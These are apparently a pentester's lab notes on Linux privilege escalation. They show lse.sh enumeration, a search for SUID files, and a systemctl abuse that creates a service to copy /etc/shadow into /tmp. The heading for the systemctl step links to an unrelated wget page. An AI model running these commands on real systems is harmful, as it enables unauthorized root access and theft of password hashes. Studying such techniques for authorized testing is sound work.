<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abuse of functionality of executables</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Abuse of functionality of executables</h1><br />0. <a
      href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux
      Smart Enumeration(lse.sh)</a><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-i&nbsp;|&nbsp;more</div>
    </div><br /> <a href=""><img src="images/1853-1.png" alt="images/1853-1.png" /></a><br />1. manually locate files
    with the SUID or SGID bits set:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;find&nbsp;/&nbsp;-type&nbsp;f&nbsp;-a&nbsp;\(&nbsp;-perm&nbsp;-u+s&nbsp;-o&nbsp;-perm&nbsp;-g+s&nbsp;\)&nbsp;-exec&nbsp;ls&nbsp;-l&nbsp;{}&nbsp;\;&nbsp;2&gt;&nbsp;/dev/null
      </div>
    </div><br /> <a href=""><img src="images/1853-2.png"
        alt="images/1853-2.png" /></a><br /><br /><br /><br /><strong>systemctl</strong> (<a
      href="https://gtfobins.github.io/gtfobins/wget/#file-upload" target="_blank">https://gtfobins.github.io/gtfobins/wget/#file-upload</a>)<br />
    We have to run these commands, one after the other, <span style="text-decoration:underline;">but first we need to
      edit them a little bit</span><br /> <a href=""><img src="images/1853-3.png" alt="images/1853-3.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;TF=$(mktemp).service<br />target@debian:~$&nbsp;echo&nbsp;&#39;[Service]<br />&gt;&nbsp;ExecStart=/bin/sh&nbsp;-c&nbsp;&quot;cat&nbsp;/etc/shadow&nbsp;&gt;&nbsp;/tmp/output&quot;<br />&gt;&nbsp;[Install]<br />&gt;&nbsp;WantedBy=multi-user.target&#39;&nbsp;&gt;&nbsp;$TF<br />target@debian:~$&nbsp;/bin/systemctl&nbsp;link&nbsp;$TF<br />target@debian:~$&nbsp;/bin/systemctl&nbsp;enable&nbsp;--now&nbsp;$TF<br /><br />target@debian:~$&nbsp;cat&nbsp;/tmp/output
      </div>
    </div>
  </div>
</body>

</html>